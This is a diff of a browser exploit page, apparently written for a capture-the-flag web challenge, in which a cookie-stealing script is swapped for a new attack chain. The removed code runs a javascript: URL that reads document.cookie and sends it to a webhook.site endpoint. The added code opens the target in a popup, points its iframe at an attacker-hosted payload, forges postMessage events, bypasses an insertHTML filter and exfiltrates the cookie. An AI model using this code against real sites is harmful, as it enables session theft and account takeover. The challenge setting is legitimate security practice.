@@ -5,61 +5,46 @@
 <script>
 console.log("PWN-START");
 
-// Le FLAG cookie est défini sur domain "10-fast-fishers-app" avec httpOnly: false
-// T1 (cette page) va ouvrir T2 vers http://10-fast-fishers-app:5000/
-// T1 va tenter de naviguer T2 vers javascript: URL pour extraire document.cookie
+// Exploit chain:
+// 1) Open the target app in T2.
+// 2) Repoint T2 iframe[0] to our attacker frame (WindowProxy remains same).
+// 3) Attacker frame postMessage() to parent with forged FISH_CLICKED.
+// 4) Bypass inserthtml guard via trailing space: "insertHTML ".
+// 5) Execute onerror JS in parent origin and exfiltrate document.cookie.
 
-const WEBHOOK = "https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad";
 const target = "http://10-fast-fishers-app:5000/";
+const framePayload = "https://egraomire2.github.io/CTF-attacker-serv/frame_payload.html";
 
-let w = null;
-let n = 0;
-let iv = null;
+const w = window.open(target, "_blank");
+console.log("POPUP-OPENED-" + target);
 
-function attemptLeak() {
-  n++;
+let tries = 0;
+const navLoop = setInterval(() => {
+  tries++;
   try {
     if (!w || w.closed) {
-      console.log("NO-POPUP-YET");
+      clearInterval(navLoop);
+      console.log("POPUP-CLOSED");
       return;
     }
 
-    // JavaScript URL pour extraire et envoyer le cookie
-    // Exécuté dans le contexte de T2 (http://10-fast-fishers-app:5000/)
-    const js = "javascript:(function(){" +
-      "const c = document.cookie;" +
-      "console.log('COOKIE-VALUE:' + c);" +
-      "if(c && c.length > 0) {" +
-        "fetch('" + WEBHOOK + "?stolen=' + encodeURIComponent(c)).catch(()=>{});" +
-      "}" +
-      "})()";
-    
-    try {
-      w.location = js;
-      console.log("ATTEMPT-" + n);
-    } catch (e) {
-      console.log("ATTEMPT-ERR:" + e.message);
+    // This is the key primitive: cross-origin write to iframe location.
+    w.frames[0].location = framePayload;
+    console.log("IFRAME-NAV-OK-" + tries);
+
+    // Keep trying a bit to win races with app's own activity.
+    if (tries >= 8) {
+      clearInterval(navLoop);
+      console.log("PWN-DONE");
     }
   } catch (e) {
-    console.log("CYCLE-ERR:" + e.message);
+    console.log("IFRAME-NAV-ERR-" + tries + ":" + e.message);
+    if (tries >= 20) {
+      clearInterval(navLoop);
+      console.log("PWN-ABORT");
+    }
   }
-
-  if (n >= 30) {
-    clearInterval(iv);
-    console.log("PWN-DONE");
-  }
-}
-
-// Phase 1: ouvrir T2 et ne surtout pas injecter javascript: immédiatement.
-// Sinon on casse la navigation vers target et COOKIE-VALUE reste vide.
-w = window.open(target, "_blank");
-console.log("POPUP-OPENED-" + target);
-
-// Phase 2: laisser T2 charger la page cible, puis lancer des tentatives rapides.
-setTimeout(() => {
-  console.log("STARTING-LEAK-LOOP");
-  iv = setInterval(attemptLeak, 90);
-}, 1500);
+}, 180);
 
 </script>
 </body>
